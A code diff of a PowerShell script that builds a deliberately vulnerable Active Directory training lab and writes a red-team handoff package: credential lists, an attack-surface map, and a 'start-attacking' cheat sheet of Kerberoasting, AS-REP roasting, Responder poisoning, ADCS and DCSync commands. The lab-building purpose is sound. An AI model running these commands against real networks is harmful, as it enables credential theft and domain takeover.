+## 7. ENGAGEMENT TIMELINE
+
+| Phase | Days | Objectives |
+|-------|------|-----------|
+| **1. Reconnaissance** | Day 1 | Network scanning, service enumeration, AD discovery |
+| **2. Enumeration** | Day 1–2 | BloodHound collection, share enumeration, user mapping |
+| **3. Initial Exploitation** | Day 2–3 | Kerberoasting, AS-REP, NTLM relay, credential attacks |
+| **4. Privilege Escalation** | Day 3–4 | ACL abuse, delegation attacks, ADCS exploitation |
+| **5. Lateral Movement** | Day 4 | Cross-host movement, trust abuse, domain compromise |
+| **6. Reporting** | Day 4–5 | Attack narrative, findings documentation, remediation |
+
+---
+
+## 8. DELIVERABLE EXPECTATIONS
+
+1. **Executive Summary** — Business-risk overview for leadership
+2. **Technical Findings** — Each finding with CVSS v3.1 score
+3. **Full Attack Narrative** — Step-by-step with screenshots and tool output
+4. **Remediation Recommendations** — Prioritized by risk and implementation effort
+5. **BloodHound Data** — Attack path visualizations
+6. **Appendices** — Scan results, raw evidence (sanitized)
+
+---
+
+## 9. SAFETY NOTICE
+
+> **⚠️ This is a deliberately vulnerable lab environment for authorized testing only.**
+>
+> - Do NOT expose these systems to production networks or the internet
+> - All credentials are intentionally weak by design
+> - Destroy the lab environment when testing is complete
+> - Do not use discovered techniques against systems outside the defined scope
+
+---
+
+*This document is the property of $($Config.clientName). Unauthorized distribution is prohibited. Provided under mutual NDA.*
+*Generated by Insta-Internal-Labinator v$SCRIPT_VERSION*
 "@
     Set-Content -Path (Join-Path $handoffDir "Handoff.md") -Value $handoffMd -Force
 
-    # ── lab-credentials.txt ──
+    # ────── lab-credentials.txt ──────
+    $weakCount = @($ADUsers | Where-Object { $_.WeakPW }).Count
+    $svcUsers = @($ADUsers | Where-Object { $_.AccountType -eq "Service" })
+    $tmpUsers = @($ADUsers | Where-Object { $_.AccountType -eq "Temporary" })
+    $admUsers = @($ADUsers | Where-Object { $_.AccountType -eq "Admin" })
+
     $credLines = @"
 ================================================================================
-  INSTA-INTERNAL-LABINATOR — LAB CREDENTIALS
+  $($Config.clientName.ToUpper()) — LAB CREDENTIALS
   Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+  Engagement: $engId
   Domain: $($Config.domain) ($domainNetbios)
+  Insta-Internal-Labinator v$SCRIPT_VERSION
 ================================================================================
 
 DOMAIN CONTROLLERS
 ──────────────────
-  DC01: $dcIP1   (Administrator / vagrant)
-  DC02: $dcIP2   (Administrator / vagrant)
+  DC01:  $dcIP1   $($Config.domain)  (PDC, DNS, ADCS, GPO)
+    Local Admin:  Administrator / vagrant
+    WinRM (SSL):  https://${dcIP1}:5986
 
-SERVER(S)
-─────────
-  SRV02: $srvIP  (Administrator / vagrant)
+  DC02:  $dcIP2   $($Config.domain)  (BDC, DNS, Replication)
+    Local Admin:  Administrator / vagrant
+    WinRM (SSL):  https://${dcIP2}:5986
 
-INITIAL LOW-PRIV ACCOUNT (Assumed Breach)
-─────────────────────────────────────────
+MEMBER SERVERS
+──────────────
+  SRV02: $srvIP   $($Config.domain)  (File Server, MSSQL, IIS)
+    Local Admin:  Administrator / vagrant
+    WinRM (SSL):  https://${srvIP}:5986
+    MSSQL:        ${srvIP}:1433 (default instance)
+    HTTP:         http://${srvIP}/ (IIS)
+
+NETWORK
+───────
+  Lab Network:  $($Config.cidr) on $VMnet (Host-Only, No DHCP)
+  Host IP:      $($NetInfo.Subnet).1
+  DNS:          $dcIP1, $dcIP2
+
+ASSUMED BREACH CREDENTIALS (Low-Priv)
+──────────────────────────────────────
+  Domain:   $($Config.domain)
   Username: $domainNetbios\$($Config.lowPrivUser.username)
   Password: $($Config.lowPrivUser.password)
 
 ATTACKER VM
 ───────────
-  IP: $attackerIP
+  IP:  $attackerIP
   SSH: ssh vagrant@$attackerIP (password: vagrant)
 
-KERBEROASTABLE SERVICE ACCOUNTS
-────────────────────────────────
+KERBEROASTABLE SERVICE ACCOUNTS ($($ServiceAccounts.Count))
+───────────────────────────────────────────────────────────
+
 "@
     foreach ($svc in $ServiceAccounts) {
-        $credLines += "  $($svc.Name) / $($svc.Password)  (SPN: $($svc.SPN))`n"
+        $spn = $svc.SPN -replace "\{domain\}", $Config.domain
+        $credLines += "  $($svc.Name.PadRight(20)) $($svc.Password.PadRight(18)) SPN: $spn`n"
     }
 
-    $credLines += @"
-
-WEAK PASSWORD ACCOUNTS (Subset — $(@($ADUsers | Where-Object { $_.WeakPW }).Count) of $($ADUsers.Count) total)
-──────────────────────────
-"@
-    $weakUsers = $ADUsers | Where-Object { $_.WeakPW } | Select-Object -First 25
-    foreach ($u in $weakUsers) {
-        $credLines += "  $($u.Username) / $($u.Password)  ($($u.Department))`n"
+    $credLines += "`nSERVICE ACCOUNT USERS ($($svcUsers.Count))`n"
+    foreach ($u in $svcUsers) {
+        $credLines += "  $($u.Username.PadRight(22)) $($u.Password)`n"
     }
-    $credLines += "`n  ... and $(@($ADUsers | Where-Object { $_.WeakPW }).Count - [Math]::Min(25, @($ADUsers | Where-Object { $_.WeakPW }).Count)) more weak passwords in the domain.`n"
 
-    $credLines += @"
+    $credLines += "`nADMIN SHADOW ACCOUNTS ($($admUsers.Count))`n"
+    foreach ($u in $admUsers) {
+        $credLines += "  $($u.Username.PadRight(22)) $($u.Password)`n"
+    }
 
-ACTIVE MISCONFIGURATIONS
-────────────────────────
-"@
-    foreach ($mc in $Misconfigs) {
-        $credLines += "  [x] $($mc.Id) — $($mc.Description)`n"
+    $credLines += "`nTEMPORARY/CONTRACTOR ACCOUNTS ($($tmpUsers.Count))`n"
+    foreach ($u in $tmpUsers) {
+        $credLines += "  $($u.Username.PadRight(22)) $($u.Password)`n"
+    }
+
+    $credLines += "`nWEAK PASSWORD ACCOUNTS ($weakCount of $($ADUsers.Count) total, $(([math]::Round($weakCount / [math]::Max($ADUsers.Count,1) * 100)))%)`n"
+    $weakSample = $ADUsers | Where-Object { $_.WeakPW -and $_.AccountType -eq "Regular" } | Select-Object -First 30
+    foreach ($u in $weakSample) {
+        $credLines += "  $($u.Username.PadRight(22)) $($u.Password.PadRight(18)) $($u.Department)`n"
+    }
+    if ($weakCount -gt 30) { $credLines += "  ... and $($weakCount - 30) more (see all-users.csv)`n" }
+
+    $credLines += "`nACTIVE MISCONFIGURATIONS ($($Misconfigs.Count))`n"
+    $credLines += "─" * 60 + "`n"
+    foreach ($mc in $Misconfigs | Sort-Object { $_.Severity }) {
+        $sevColor = switch ($mc.Severity) { "Critical" { "!!!" } "High" { "!! " } "Medium" { "!  " } default { "   " } }
+        $credLines += "  [$sevColor] $($mc.Id.PadRight(22)) $($mc.Desc)`n"
+        $credLines += "        Attack: $($mc.AttackPath)`n"
     }
 
     Set-Content -Path (Join-Path $handoffDir "lab-credentials.txt") -Value $credLines -Force
 
-    # ── network-map.txt ──
+    # ────── network-map.txt ──────
     $networkMap = @"
 ================================================================================
-  NETWORK MAP — $($Config.clientName) Lab Environment
-  CIDR: $($Config.cidr)   |   VMnet: $VMnet   |   Domain: $($Config.domain)
+  NETWORK MAP — $($Config.clientName)
+  CIDR: $($Config.cidr)  |  VMnet: $VMnet  |  Domain: $($Config.domain)
 ================================================================================
 
-                        ┌──────────────────────────┐
-                        │     INTERNET / NAT       │
-                        │    (VMware NAT Adapter)   │
-                        └────────────┬─────────────┘
-                                     │
-                                     │ eth0 (NAT)
-                        ┌────────────┴─────────────┐
-                        │      ATTACKER VM         │
-                        │   Ubuntu 24.04 LTS       │
-                        │   IP: $attackerIP       │
-                        │   Tools: Impacket, nmap  │
-                        │   Docker + C2 Beacon     │
-                        └────────────┬─────────────┘
-                                     │ eth1 (Host-Only)
-                                     │
-          ═══════════════════════════════════════════════════
-          ║           HOST-ONLY NETWORK ($VMnet)           ║
-          ║              $($Config.cidr.PadRight(20))                  ║
-          ═══════════════════════════════════════════════════
-              │                   │                   │
-    ┌─────────┴────────┐ ┌───────┴────────┐ ┌────────┴───────┐
-    │      DC01        │ │      DC02      │ │     SRV02      │
-    │ Win Server 2019  │ │ Win Server 2019│ │ Win Server 2019│
-    │ IP: $($dcIP1.PadRight(14))│ │ IP: $($dcIP2.PadRight(12))│ │ IP: $($srvIP.PadRight(13))│
-    │ Roles:           │ │ Roles:         │ │ Roles:         │
-    │  - AD DS (PDC)   │ │  - AD DS (BDC) │ │  - File Server │
-    │  - DNS           │ │  - DNS         │ │  - MSSQL       │
-    │  - ADCS          │ │  - Replication │ │  - IIS         │
-    └──────────────────┘ └────────────────┘ └────────────────┘
+  HOST MACHINE
+  ├─ $VMnet: $($NetInfo.Subnet).1/24  (Host-Only / Lab Network)
+  └─ Docker Desktop (agent stack / C2)
 
-  LEGEND:
-    PDC = Primary Domain Controller    BDC = Backup Domain Controller
-    ADCS = AD Certificate Services     MSSQL = SQL Server
+              ┌─────────────────────────────────────┐
+              │   HOST-ONLY NETWORK ($VMnet)         │
+              │       $($Config.cidr.PadRight(25))       │
+              └──┬──────────┬──────────┬─────────────┘
+                 │          │          │
+       ┌────────┴───────┐ ┌┴──────────┴──┐ ┌──────────────────┐
+       │   DC01          │ │    DC02       │ │     SRV02        │
+       │ $($dcIP1.PadRight(15))│ │ $($dcIP2.PadRight(13))│ │ $($srvIP.PadRight(16))│
+       │ Win Svr 2019    │ │ Win Svr 2019 │ │ Win Svr 2019     │
+       │                 │ │              │ │                  │
+       │ • AD DS (PDC)   │ │ • AD DS (BDC)│ │ • File Server    │
+       │ • DNS           │ │ • DNS        │ │ • MSSQL :1433    │
+       │ • ADCS          │ │ • Replication│ │ • IIS :80        │
+       │ • GPO           │ │              │ │ • Open Shares    │
+       └─────────────────┘ └──────────────┘ └──────────────────┘
+
+  ATTACK SURFACE
+  ──────────────
+  Port  │ Service          │ Hosts         │ Notes
+  ──────┼──────────────────┼───────────────┼────────────────────
+  53    │ DNS              │ DC01, DC02    │ Zone transfer may be possible
+  80    │ HTTP (IIS)       │ SRV02         │ Web app + upload
+  88    │ Kerberos         │ DC01, DC02    │ Kerberoast, AS-REP
+  135   │ RPC              │ All           │ Endpoint mapper
+  137   │ NBT-NS           │ All           │ Poisonable
+  139   │ NetBIOS-SSN      │ All           │ Legacy SMB
+  389   │ LDAP             │ DC01, DC02    │ AD enumeration
+  443   │ HTTPS/ADCS       │ DC01          │ Certificate enrollment
+  445   │ SMB              │ All           │ Signing NOT required
+  636   │ LDAPS            │ DC01, DC02    │ Encrypted LDAP
+  1433  │ MSSQL            │ SRV02         │ SQL Server default
+  3389  │ RDP              │ All           │ Remote Desktop
+  5355  │ LLMNR            │ All           │ Poisonable
+  5985  │ WinRM HTTP       │ All           │ PS Remoting
+  5986  │ WinRM HTTPS      │ All           │ PS Remoting (SSL)
+  9389  │ ADWS             │ DC01, DC02    │ AD Web Services
 "@
     Set-Content -Path (Join-Path $handoffDir "network-map.txt") -Value $networkMap -Force
 
-    # ── attacker-vm-access.md ──
-    $attackerAccess = @"
+    # ────── start-attacking.md ──────
+    $startAttacking = @"
+# Attack Quick Reference — $($Config.clientName)
+
+## Credentials
+``````
+Domain:   $($Config.domain)
+NetBIOS:  $domainNetbios
+User:     $domainNetbios\$($Config.lowPrivUser.username)
+Pass:     $($Config.lowPrivUser.password)
+DC1:      $dcIP1
+DC2:      $dcIP2
+SRV:      $srvIP
+Attacker: $attackerIP
+``````
+
+---
+
+## Phase 0 — Recon
+``````bash
+nmap -sn $($Config.cidr) -oA scans/pingsweep
+nmap -sC -sV -O $dcIP1 $dcIP2 $srvIP -oA scans/full
+``````
+
+## Phase 1 — AD Enumeration
+``````bash
+netexec smb $($NetInfo.Subnet).0/24 -u '$($Config.lowPrivUser.username)' -p '$($Config.lowPrivUser.password)' -d $($Config.domain) --shares
+netexec smb $dcIP1 -u '$($Config.lowPrivUser.username)' -p '$($Config.lowPrivUser.password)' -d $($Config.domain) --users
+netexec smb $dcIP1 -u '$($Config.lowPrivUser.username)' -p '$($Config.lowPrivUser.password)' -d $($Config.domain) --pass-pol
+ldapdomaindump -u '$($Config.domain)\$($Config.lowPrivUser.username)' -p '$($Config.lowPrivUser.password)' $dcIP1 -o loot/ldap/
+``````
+
+## Phase 2 — BloodHound
+``````bash
+bloodhound-python -u '$($Config.lowPrivUser.username)' -p '$($Config.lowPrivUser.password)' \
+  -d $($Config.domain) -ns $dcIP1 -c all --zip -o bloodhound/
+``````
+
+## Phase 3 — Kerberos Attacks
+``````bash
+# AS-REP Roasting
+impacket-GetNPUsers $($Config.domain)/ -usersfile users.txt -dc-ip $dcIP1 -format hashcat -o loot/asrep.txt
+
+# Kerberoasting
+impacket-GetUserSPNs '$($Config.domain)/$($Config.lowPrivUser.username):$($Config.lowPrivUser.password)' \
+  -dc-ip $dcIP1 -request -outputfile loot/kerberoast.txt
+``````
+
+## Phase 4 — SMB & Shares
+``````bash
+netexec smb $srvIP -u '$($Config.lowPrivUser.username)' -p '$($Config.lowPrivUser.password)' -d $($Config.domain) -M spider_plus
+netexec smb $dcIP1 -u '$($Config.lowPrivUser.username)' -p '$($Config.lowPrivUser.password)' -d $($Config.domain) -M gpp_password
+``````
+
+## Phase 5 — NTLM Relay & Poisoning
+``````bash
+# Responder
+cd /opt/Responder && sudo python3 Responder.py -I eth1 -wrFd
+``````
+
+## Phase 6 — ADCS
+``````bash
+certipy find -u '$($Config.lowPrivUser.username)@$($Config.domain)' -p '$($Config.lowPrivUser.password)' -dc-ip $dcIP1 -stdout
+``````
+
+## Phase 7 — Privilege Escalation
+``````bash
+# After cracking Kerberoast/ASREP hashes, or finding ACL paths in BloodHound:
+# DCSync (requires DA or replication rights)
+impacket-secretsdump '$($Config.domain)/administrator:vagrant@$dcIP1' -just-dc
+``````
+"@
+    Set-Content -Path (Join-Path $handoffDir "start-attacking.md") -Value $startAttacking -Force
+
+    # ────── attacker-vm-access.md ──────
+    $attackerDoc = @"
 # Attacker VM Access Guide
 
 ## SSH Access
-
 ``````bash
 ssh vagrant@$attackerIP
 # Password: vagrant
 ``````
 
-## C2 Container
-
-$(if ($Config.c2DockerImage) {
-@"
-The C2 beacon container is automatically deployed and running:
-
-``````bash
-# Check C2 status
-cd /opt/c2
-docker compose ps
-
-# View C2 logs
-docker compose logs -f
-
-# Restart C2
-docker compose restart
-
-# Stop C2
-docker compose down
-
-# Start C2
-docker compose up -d
-``````
-
-**C2 Image:** ``$($Config.c2DockerImage)``
-"@
-} else {
-@"
-No C2 Docker image was specified in the config. To deploy one manually:
-
-``````bash
-ssh vagrant@$attackerIP
-mkdir -p /opt/c2
-cd /opt/c2
-# Create your docker-compose.yml and .env files
-docker compose up -d
-``````
-"@
-})
-
 ## Engagement Workspace
-
-A workspace directory is pre-created at:
 ``````
 /home/vagrant/engagement/
-├── scans/       # nmap, masscan output
-├── loot/        # captured hashes, tickets, creds
-├── notes/       # engagement notes
-└── bloodhound/  # BloodHound data collection
+  scans/       # nmap, masscan output
+  loot/        # hashes, tickets, creds
+  notes/       # engagement notes
+  bloodhound/  # BloodHound data collection
 ``````
 
 ## Installed Tools
+| Tool | Command | Purpose |
+|------|---------|---------|
+| Impacket | ``impacket-*`` | AD attack suite |
+| NetExec | ``netexec`` | SMB/LDAP/WinRM enumeration |
+| Responder | ``/opt/Responder/`` | LLMNR/NBT-NS poisoning |
+| Certipy | ``certipy`` | ADCS exploitation |
+| BloodHound | ``bloodhound-python`` | AD path analysis |
+| Kerbrute | ``kerbrute`` | Kerberos enumeration |
+| enum4linux-ng | ``/opt/enum4linux-ng/`` | SMB enumeration |
+| nmap | ``nmap`` | Port scanning |
+| masscan | ``masscan`` | Fast port scanning |
 
-| Tool | Location | Purpose |
-|------|----------|---------|
-| Impacket | /opt/impacket | AD attack suite |
-| Responder | /opt/Responder | LLMNR/NBT-NS poisoning |
-| enum4linux-ng | /opt/enum4linux-ng | SMB/AD enumeration |
-| Kerbrute | /usr/local/bin/kerbrute | Kerberos user enum & brute |
-| NetExec | pip install | CrackMapExec successor |
-| BloodHound | apt install | AD attack path mapping |
-| Certipy | pip install | ADCS exploitation |
-| nmap | apt install | Network scanning |
-| CrackMapExec | apt install | Network pentesting |
+$(if ($Config.c2DockerImage) {
+"## C2 Container
+``````bash
+cd /opt/c2
+docker compose ps       # status
+docker compose logs -f  # logs
+docker compose restart  # restart
+``````
+**Image:** ``$($Config.c2DockerImage)``"
+} else {
+"## C2 Setup (manual)
+``````bash
+mkdir -p /opt/c2 && cd /opt/c2
+# Create your docker-compose.yml
+docker compose up -d
+``````"
+})
 "@
-    Set-Content -Path (Join-Path $handoffDir "attacker-vm-access.md") -Value $attackerAccess -Force
+    Set-Content -Path (Join-Path $handoffDir "attacker-vm-access.md") -Value $attackerDoc -Force
 
-    # ── start-attacking.md ──
-    $startAttacking = @"
-# Start Attacking — Quick Reference
-
-## Phase 0: Initial Reconnaissance
-
-``````bash
-# SSH into attacker VM
-ssh vagrant@$attackerIP
-
-# Verify network connectivity
-ping -c 3 $dcIP1
-
-# Quick port scan of the subnet
-nmap -sn $($Config.cidr) -oA engagement/scans/pingsweep
-
-# Full scan of discovered hosts
-nmap -sC -sV -O $dcIP1 $dcIP2 $srvIP -oA engagement/scans/full-scan
-``````
-
-## Phase 1: Domain Enumeration (with low-priv creds)
-
-``````bash
-# Enumerate domain with CrackMapExec / NetExec
-netexec smb $($NetInfo.Subnet).0/24 -u '$($Config.lowPrivUser.username)' -p '$($Config.lowPrivUser.password)' --shares
-netexec smb $($NetInfo.Subnet).0/24 -u '$($Config.lowPrivUser.username)' -p '$($Config.lowPrivUser.password)' --users
-netexec smb $($NetInfo.Subnet).0/24 -u '$($Config.lowPrivUser.username)' -p '$($Config.lowPrivUser.password)' --pass-pol
-
-# LDAP enumeration
-ldapsearch -x -H ldap://$dcIP1 -D "$($Config.lowPrivUser.username)@$($Config.domain)" -w '$($Config.lowPrivUser.password)' -b "DC=$($domainParts -join ',DC=')" "(objectClass=user)" samAccountName
-
-# enum4linux
-cd /opt/enum4linux-ng
-python3 enum4linux-ng.py -A -u '$($Config.lowPrivUser.username)' -p '$($Config.lowPrivUser.password)' $dcIP1
-``````
-
-## Phase 2: BloodHound Collection
-
-``````bash
-# Collect BloodHound data
-bloodhound-python -u '$($Config.lowPrivUser.username)' -p '$($Config.lowPrivUser.password)' \
-  -d $($Config.domain) -ns $dcIP1 -c all \
-  --zip -o engagement/bloodhound/
-
-# Start neo4j and BloodHound UI (if GUI available)
-sudo neo4j start
-# Upload the ZIP to BloodHound
-``````
-
-## Phase 3: Kerberos Attacks
-
-``````bash
-# AS-REP Roasting
-impacket-GetNPUsers $($Config.domain)/ -usersfile engagement/users.txt \
-  -dc-ip $dcIP1 -format hashcat -outputfile engagement/loot/asrep-hashes.txt
-
-# Kerberoasting
-impacket-GetUserSPNs $($Config.domain)/$($Config.lowPrivUser.username):'$($Config.lowPrivUser.password)' \
-  -dc-ip $dcIP1 -request -outputfile engagement/loot/kerberoast-hashes.txt
-
-# Crack with hashcat (on your host)
-# hashcat -m 18200 asrep-hashes.txt wordlist.txt
-# hashcat -m 13100 kerberoast-hashes.txt wordlist.txt
-``````
-
-## Phase 4: SMB & Share Enumeration
-
-``````bash
-# Enumerate accessible shares
-smbclient -L //$dcIP1 -U '$domainNetbios\$($Config.lowPrivUser.username)%$($Config.lowPrivUser.password)'
-
-# Spider shares for sensitive files
-netexec smb $dcIP1 -u '$($Config.lowPrivUser.username)' -p '$($Config.lowPrivUser.password)' \
-  -M spider_plus -o OUTPUT=engagement/loot/shares/
-
-# Check for GPP passwords
-netexec smb $dcIP1 -u '$($Config.lowPrivUser.username)' -p '$($Config.lowPrivUser.password)' -M gpp_password
-``````
-
-## Phase 5: Lateral Movement & Privilege Escalation
-
-``````bash
-# Check for LLMNR/NBT-NS poisoning (run Responder)
-cd /opt/Responder
-sudo python3 Responder.py -I eth1 -wrFd
-
-# Pass-the-Hash (once you have hashes)
-# impacket-psexec $domainNetbios/Administrator@$dcIP1 -hashes :NTHASH
-
-# ADCS exploitation (if ESC1/ESC8 present)
-certipy find -u '$($Config.lowPrivUser.username)@$($Config.domain)' -p '$($Config.lowPrivUser.password)' -dc-ip $dcIP1
-``````
-
-## Tips
-
-- Always log everything: ``script engagement/notes/session-\$(date +%Y%m%d).log``
-- Take screenshots of every finding
-- Use ``tmux`` for persistent sessions
-- Domain: **$($Config.domain)** | User: **$($Config.lowPrivUser.username)** | DC: **$dcIP1**
-"@
-    Set-Content -Path (Join-Path $handoffDir "start-attacking.md") -Value $startAttacking -Force
-
-    # ── Full user list export ──
-    $allUsersCSV = "Username,Password,FirstName,LastName,Department,Title,WeakPassword`n"
+    # ────── all-users.csv ──────
+    $csv = "Username,Password,FirstName,LastName,Department,Title,WeakPassword,AccountType`n"
     foreach ($u in $ADUsers) {
-        $allUsersCSV += "$($u.Username),$($u.Password),$($u.FirstName),$($u.LastName),$($u.Department),$($u.Title),$($u.WeakPW)`n"
+        $csv += "$($u.Username),$($u.Password),$($u.FirstName),$($u.LastName),$($u.Department),$($u.Title),$($u.WeakPW),$($u.AccountType)`n"
     }
-    Set-Content -Path (Join-Path $handoffDir "all-users.csv") -Value $allUsersCSV -Force
+    Set-Content -Path (Join-Path $handoffDir "all-users.csv") -Value $csv -Force
 
-    Write-Log "Handoff package created: $handoffDir" "SUCCESS"
+    Write-Log "Handoff package: $handoffDir ($((Get-ChildItem $handoffDir).Count) files)" "SUCCESS"
     return $handoffDir
 }
 
-# ─── DESTROY LAB ─────────────────────────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════════
+# DESTROY LAB
+# ═══════════════════════════════════════════════════════════════════════════════
 
 function Remove-Lab {
     Write-Banner "DESTROYING LAB ENVIRONMENT"
 
-    # Destroy attacker VM
     $attackerDir = Join-Path $SCRIPT_DIR "attacker-vm"
     if (Test-Path $attackerDir) {
-        Write-Log "Destroying Attacker VM..."
+        Write-Log "Destroying Attacker VM..." "STEP"
         Push-Location $attackerDir
-        & vagrant destroy -f 2>&1 | ForEach-Object { Write-Log $_ }
+        & vagrant destroy -f 2>&1 | ForEach-Object { Write-Log $_ "DETAIL" }
         Pop-Location
         Write-Log "Attacker VM destroyed." "SUCCESS"
     }
 
-    # Destroy GOAD VMs
     if (Test-Path $GOAD_DIR) {
-        $providerDirs = @(
-            (Join-Path $GOAD_DIR "ad" "GOAD-Light" "providers" "vmware"),
-            (Join-Path $GOAD_DIR "ad" "GOAD-Light" "providers" "virtualbox"),
-            (Join-Path $GOAD_DIR "ad" "GOAD" "providers" "vmware"),
-            (Join-Path $GOAD_DIR "ad" "MINILAB" "providers" "vmware")
-        )
-        foreach ($pd in $providerDirs) {
-            if (Test-Path $pd) {
-                Write-Log "Destroying GOAD VMs in $pd..."
-                Push-Location $pd
-                & vagrant destroy -f 2>&1 | ForEach-Object { Write-Log $_ }
-                Pop-Location
-            }
-        }
+        Write-Log "Destroying GOAD VMs via goad.py..." "STEP"
+        Push-Location $GOAD_DIR
+        & python goad.py -t destroy 2>&1 | ForEach-Object { Write-Log $_ "DETAIL" }
+        Pop-Location
         Write-Log "GOAD VMs destroyed." "SUCCESS"
     }
 
-    Write-Log "Lab environment destroyed." "SUCCESS"
-    Write-Log "Handoff packages and logs preserved. Delete manually if needed." "INFO"
+    Write-Log "Lab destroyed. Handoff packages and logs preserved." "SUCCESS"
 }
 
-# ─── CONSOLE SUMMARY ─────────────────────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════════
+# FINAL SUMMARY (v3.0 — enhanced display)
+# ═══════════════════════════════════════════════════════════════════════════════
 
 function Show-Summary {
     param(
@@ -1343,136 +1822,167 @@ function Show-Summary {
 
     $domainParts = $Config.domain -split "\."
     $domainNetbios = $domainParts[0].ToUpper()
+    $weakCount = @($ADUsers | Where-Object { $_.WeakPW }).Count
 
     Write-Host ""
-    Write-Host ("=" * 80) -ForegroundColor Green
-    Write-Host ""
-    Write-Host "  ██╗███╗   ██╗███████╗████████╗ █████╗       ██╗███╗   ██╗████████╗" -ForegroundColor Red
-    Write-Host "  ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗      ██║████╗  ██║╚══██╔══╝" -ForegroundColor Red
-    Write-Host "  ██║██╔██╗ ██║███████╗   ██║   ███████║█████╗██║██╔██╗ ██║   ██║   " -ForegroundColor Red
-    Write-Host "  ██║██║╚██╗██║╚════██║   ██║   ██╔══██║╚════╝██║██║╚██╗██║   ██║   " -ForegroundColor Red
-    Write-Host "  ██║██║ ╚████║███████║   ██║   ██║  ██║      ██║██║ ╚████║   ██║   " -ForegroundColor Red
-    Write-Host "  ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝      ╚═╝╚═╝  ╚═══╝   ╚═╝   " -ForegroundColor Red
-    Write-Host "  ██╗      █████╗ ██████╗ ██╗███╗   ██╗ █████╗ ████████╗ ██████╗ ██████╗ " -ForegroundColor Yellow
-    Write-Host "  ██║     ██╔══██╗██╔══██╗██║████╗  ██║██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗" -ForegroundColor Yellow
-    Write-Host "  ██║     ███████║██████╔╝██║██╔██╗ ██║███████║   ██║   ██║   ██║██████╔╝" -ForegroundColor Yellow
-    Write-Host "  ██║     ██╔══██║██╔══██╗██║██║╚██╗██║██╔══██║   ██║   ██║   ██║██╔══██╗" -ForegroundColor Yellow
-    Write-Host "  ███████╗██║  ██║██████╔╝██║██║ ╚████║██║  ██║   ██║   ╚██████╔╝██║  ██║" -ForegroundColor Yellow
-    Write-Host "  ╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝" -ForegroundColor Yellow
-    Write-Host ""
-    Write-Host ("=" * 80) -ForegroundColor Green
-    Write-Host ""
-    Write-Host "  ENGAGEMENT SUMMARY" -ForegroundColor Cyan
-    Write-Host "  ─────────────────────────────────────────────────────" -ForegroundColor DarkGray
-    Write-Host "  Client:          $($Config.clientName)" -ForegroundColor White
-    Write-Host "  Domain:          $($Config.domain) ($domainNetbios)" -ForegroundColor White
-    Write-Host "  Network:         $($Config.cidr) on $VMnet" -ForegroundColor White
-    Write-Host "  Lab Variant:     $($Config.labVariant)" -ForegroundColor White
-    Write-Host ""
-    Write-Host "  INITIAL ACCESS (Assumed Breach)" -ForegroundColor Cyan
-    Write-Host "  ─────────────────────────────────────────────────────" -ForegroundColor DarkGray
-    Write-Host "  Username:        $domainNetbios\$($Config.lowPrivUser.username)" -ForegroundColor Yellow
-    Write-Host "  Password:        $($Config.lowPrivUser.password)" -ForegroundColor Yellow
-    Write-Host ""
-    Write-Host "  INFRASTRUCTURE" -ForegroundColor Cyan
-    Write-Host "  ─────────────────────────────────────────────────────" -ForegroundColor DarkGray
-    Write-Host "  DC01:            $($NetInfo.Subnet).10" -ForegroundColor White
-    Write-Host "  DC02:            $($NetInfo.Subnet).11" -ForegroundColor White
-    Write-Host "  SRV02:           $($NetInfo.Subnet).22" -ForegroundColor White
-    Write-Host "  Attacker VM:     $($NetInfo.Attacker)" -ForegroundColor White
-    Write-Host ""
-    Write-Host "  DOMAIN STATISTICS" -ForegroundColor Cyan
-    Write-Host "  ─────────────────────────────────────────────────────" -ForegroundColor DarkGray
-    Write-Host "  Total Users:     $($ADUsers.Count)" -ForegroundColor White
-    Write-Host "  Weak Passwords:  $(@($ADUsers | Where-Object { $_.WeakPW }).Count) ($([math]::Round(@($ADUsers | Where-Object { $_.WeakPW }).Count / $ADUsers.Count * 100))%)" -ForegroundColor Red
-    Write-Host "  Service Accts:   $($ServiceAccounts.Count) (Kerberoastable)" -ForegroundColor Red
-    Write-Host "  Misconfigs:      $($Misconfigs.Count) active" -ForegroundColor Red
-    Write-Host ""
-    Write-Host "  HANDOFF PACKAGE" -ForegroundColor Cyan
-    Write-Host "  ─────────────────────────────────────────────────────" -ForegroundColor DarkGray
-    Write-Host "  Location:        $HandoffDir" -ForegroundColor Green
-    Write-Host ""
-    Write-Host "  QUICK START" -ForegroundColor Cyan
-    Write-Host "  ─────────────────────────────────────────────────────" -ForegroundColor DarkGray
-    Write-Host "  ssh vagrant@$($NetInfo.Attacker)  (password: vagrant)" -ForegroundColor Yellow
-    Write-Host ""
-    Write-Host "  DESTROY LAB" -ForegroundColor Cyan
-    Write-Host "  ─────────────────────────────────────────────────────" -ForegroundColor DarkGray
-    Write-Host "  .\Deploy-RedTeamLab.ps1 -Destroy" -ForegroundColor Yellow
-    Write-Host ""
-    Write-Host ("=" * 80) -ForegroundColor Green
+    Write-Host "  ╔══════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Green
+    Write-Host "  ║                                                                          ║" -ForegroundColor Green
+    Write-Host "  ║   ██╗███╗   ██╗███████╗████████╗ █████╗       ██╗███╗   ██╗████████╗    ║" -ForegroundColor Red
+    Write-Host "  ║   ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗      ██║████╗  ██║╚══██╔══╝    ║" -ForegroundColor Red
+    Write-Host "  ║   ██║██╔██╗ ██║███████╗   ██║   ███████║█████╗██║██╔██╗ ██║   ██║       ║" -ForegroundColor Red
+    Write-Host "  ║   ██║██║╚██╗██║╚════██║   ██║   ██╔══██║╚════╝██║██║╚██╗██║   ██║       ║" -ForegroundColor Red
+    Write-Host "  ║   ██║██║ ╚████║███████║   ██║   ██║  ██║      ██║██║ ╚████║   ██║       ║" -ForegroundColor Red
+    Write-Host "  ║   ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝      ╚═╝╚═╝  ╚═══╝   ╚═╝       ║" -ForegroundColor Red
+    Write-Host "  ║                    L A B I N A T O R   v$SCRIPT_VERSION                          ║" -ForegroundColor Yellow
+    Write-Host "  ║                                                                          ║" -ForegroundColor Green
